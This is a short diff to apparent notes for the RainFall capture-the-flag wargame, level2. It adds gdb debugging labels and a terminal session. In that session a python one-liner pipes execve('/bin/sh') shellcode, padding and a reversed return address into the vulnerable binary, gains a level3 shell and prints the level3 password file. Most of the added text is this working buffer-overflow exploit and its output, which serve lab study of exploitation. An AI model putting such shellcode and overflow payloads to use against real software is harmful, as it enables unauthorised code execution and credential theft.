@@ -88,10 +88,26 @@ echo  "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRS
 
 define hook-stop
 
+echo "---------------------------- esp -------------"
 x/40wx $esp
-
+echo "---------------------------- eip instructions -------------"
 x/2i $eip
 
 end
 
 
+===
+
+level2@RainFall:~$ (python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\x04\xa0\x08"[::-1]'; cat) | ./level2
+
+pwd
+
+/home/user/level2
+
+whoami
+
+level3
+
+cat /home/user/level3/.pass
+
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
